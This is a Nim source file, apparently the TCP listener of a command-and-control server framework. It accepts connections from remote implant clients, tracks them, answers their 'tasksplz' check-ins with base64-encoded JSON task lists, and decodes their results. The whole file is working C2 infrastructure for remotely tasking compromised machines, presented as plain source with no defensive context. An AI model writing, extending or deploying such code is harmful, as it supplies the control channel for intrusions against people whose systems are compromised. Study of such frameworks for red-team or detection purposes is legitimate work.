import asyncdispatch, asyncnet, asyncfutures, strutils, json, base64, times, tables

import ../types, ../logging, ../processMessage, ../events

proc processMessages(server: C2Server, tcpListener: TCPListener, tcpSocket: TCPSocket, client: ref C2Client) {.async.} =
  
  var msgS: string = ""
  var linesRecv: int = 0
  var line: string = ""
  while not tcpSocket.socket.isClosed:
    try: 
      line = await tcpSocket.socket.recvLine(maxLength=1000000)
    except OSError: discard

    if line.len == 0:
      client.connected = false
      tcpSocket.socket.close()
      cDisconnected(client[], "client died")
      onClientDisconnected(client[])
      continue

    inc linesRecv

    msgS &= line

    var response: JsonNode
    try:
      response = parseJson(decode(msgS))
    except JsonParsingError: 
      if msgS == "tasksplz":
        client.lastCheckin = now()
        msgS = ""
        linesRecv = 0
        var j: JsonNode = %*[]
        for task in client.server.tasks:
          if task.client == client[] and task.status == TaskCreated:
            task.status = TaskNotCompleted
            j.add %*{
              "task": task.action,
              "taskId": task.id,
              "data": task.arguments
            }
        onClientCheckin(client[])  
        try:
          await tcpSocket.socket.send(encode($j) & "\r\n")
        except OSError: discard
      continue

    msgS = ""
    linesRecv = 0 

    discard processMessage(client, response)

proc createNewTcpListener*(server: C2Server, instance: ListenerInstance) {.async.} =
  let id = 1
  let ipAddress = instance.ipAddress
  let port = instance.port
  let config = instance.config

  let tcpServer = TCPListener(
      sockets: @[], 
      port: int port,
      listeningIP: ipAddress,
      id: id, 
      socket: newAsyncSocket(),
      running: true
    )
  try:
    tcpServer.socket.setSockOpt(OptReuseAddr, true)
    tcpServer.socket.bindAddr(port, ipAddress)
    tcpServer.socket.listen()
  except OSError:
    errorLog getCurrentExceptionMsg()
    return
  
  proc stop() =
    for socket in tcpServer.sockets:
      socket.socket.close()
    # tcpServer.running = false
    # tcpServer.socket.close()
  instance.stopProc = stop

  # server.tcpListeners.add(tcpServer)
  infoLog "listening on " & tcpServer.listeningIP & ":" & $tcpServer.port & " using a tcp socket"
  
  while tcpServer.running:
    let 
      (netAddr, clientSocket) = await tcpServer.socket.acceptAddr()
      client = C2Client(
        id: server.clients.len,
        connected: true,
        loaded: false,
        isAdmin: false,
        hostname: "placeholder",
        username: "placeholder",
        server: server,
        ipAddress: netAddr
      )
      tcpSocket = TCPSocket(
        socket: clientSocket,
        id: client.id,
        netAddr: netAddr,
        tcpListener: tcpServer
      )

    var cRef = new(ref C2Client)
    cRef[] = client

    server.clients.add(client)
    tcpServer.sockets.add(tcpSocket)

    asyncCheck processMessages(server, tcpServer, tcpSocket, cRef)

  infoLog $tcpServer & " stopped"

let listener* = Listener(
  name: "tcp",
  startProc: createNewTcpListener
)